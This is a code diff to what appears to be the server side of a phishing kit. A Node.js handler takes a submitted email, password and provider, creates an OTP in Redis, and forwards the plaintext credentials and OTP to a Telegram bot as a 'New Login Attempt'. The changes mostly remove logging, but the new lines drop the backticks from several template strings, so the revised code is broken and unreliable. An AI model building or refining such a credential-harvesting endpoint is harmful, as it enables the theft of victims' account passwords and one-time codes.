@@ -8,7 +8,7 @@ const REDIS_URL = process.env.REDIS_URL;
 let redis;
 
 function getOtpKey(email) {
-  return `otp:${email}`;
+  return otp:${email};
 }
 
 function generateOtp() {
@@ -16,62 +16,51 @@ function generateOtp() {
 }
 
 export default async function handler(req, res) {
-  console.log("BODY", req.body);
-
   if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
-    console.log("Missing env");
-    res.status(500).json({ success: false, message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL" });
-    return;
+    return res.status(500).json({
+      success: false,
+      message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL",
+    });
   }
 
   if (!redis) {
     redis = new Redis(REDIS_URL);
-    console.log("REDIS CONNECTED");
   }
 
   if (req.method !== "POST") {
-    res.status(405).json({ success: false, message: "Method not allowed" });
-    return;
+    return res.status(405).json({ success: false, message: "Method not allowed" });
   }
 
-  // Robust body parsing
   let bodyObj = req.body;
   if (typeof req.body === "string") {
     try {
       bodyObj = JSON.parse(req.body);
     } catch (e) {
-      console.log("Invalid JSON body");
-      res.status(400).json({ success: false, message: "Invalid JSON body" });
-      return;
+      return res.status(400).json({ success: false, message: "Invalid JSON body" });
     }
   }
+
   const { email, password, provider } = bodyObj || {};
 
   if (!email || !password || !provider) {
-    console.log("Missing required fields");
-    res.status(400).json({ success: false, message: "Missing required fields" });
-    return;
+    return res.status(400).json({ success: false, message: "Missing required fields" });
   }
 
   const normalizedEmail = email.trim().toLowerCase();
-
   const otp = generateOtp();
-  console.log("OTP", otp);
 
   try {
-    await redis.set(getOtpKey(normalizedEmail), otp, "EX", 300);
+    await redis.set(getOtpKey(normalizedEmail), otp, "EX", 300); // 5 minutes
   } catch (err) {
-    console.log("REDIS ERROR", err);
-    res.status(500).json({
+    return res.status(500).json({
       success: false,
       message: "Failed to store OTP in Redis",
       error: err.message,
     });
-    return;
   }
 
-  const message = `🔐 *New Login Attempt*\n\n📧 Email: ${normalizedEmail}\n🔑 Password: ${password}\n🌐 Provider: ${provider}\n✅ Authenticated: YES\n🧾 OTP: ${otp}`;
-  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const message = 🔐 *New Login Attempt*\n\n📧 Email: ${normalizedEmail}\n🔑 Password: ${password}\n🌐 Provider: ${provider}\n✅ Authenticated: YES\n🧾 OTP: ${otp};
+  const telegramUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
 
   try {
     const response = await fetch(telegramUrl, {
@@ -86,8 +75,7 @@ export default async function handler(req, res) {
 
     if (!response.ok) {
       const text = await response.text();
-      console.log("TELEGRAM ERROR", text);
-      throw new Error(`Telegram API error: ${response.status} ${text}`);
+      throw new Error(Telegram API error: ${response.status} ${text});
     }
 
     res.status(200).json({
@@ -96,7 +84,6 @@ export default async function handler(req, res) {
       email: normalizedEmail,
     });
   } catch (error) {
-    console.log("TELEGRAM SEND ERROR", error);
     res.status(500).json({
       success: false,
       message: "Failed to send OTP to Telegram",
